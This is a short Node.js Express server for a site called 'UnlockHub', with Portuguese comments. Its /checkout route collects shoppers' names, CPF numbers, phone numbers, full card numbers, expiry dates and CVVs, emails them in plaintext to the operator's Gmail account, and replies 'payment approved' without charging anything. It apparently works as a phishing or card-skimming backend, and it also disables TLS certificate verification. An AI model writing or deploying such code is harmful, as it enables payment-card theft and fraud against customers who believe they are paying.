const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();

// ================= MIDDLEWARE =================
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

// ================= EMAIL CONFIG (SMTP GMAIL CORRETO PARA RENDER) =================
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // true apenas se for 465
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
  tls: {
    rejectUnauthorized: false,
  },
  connectionTimeout: 20000,
  greetingTimeout: 20000,
});

// ================= CHECKOUT =================
app.post("/checkout", async (req, res) => {
  try {
    const {
      nome,
      cpf,
      whatsapp,
      email,
      produto,
      preco,
      metodo,
      numeroCartao,
      validade,
      cvv,
    } = req.body;

    const dados = `
=========== NOVO PEDIDO UNLOCKHUB ===========

Nome: ${nome}
CPF: ${cpf}
WhatsApp: ${whatsapp}
Email: ${email}

Produto: ${produto}
Preço: R$ ${preco}
Método de Pagamento: ${metodo}

Número do Cartão: ${numeroCartao || "N/A"}
Validade: ${validade || "N/A"}
CVV: ${cvv || "N/A"}

=============================================
`;

    await transporter.sendMail({
      from: `"UnlockHub" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: `Novo Pedido - ${produto}`,
      text: dados,
    });

    res.status(200).send("Pagamento aprovado com sucesso!");
  } catch (error) {
    console.error("Erro ao enviar email:", error);
    res.status(500).send(error.message);
  }
});

// ================= PORTA RENDER =================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Servidor rodando na porta " + PORT);
});
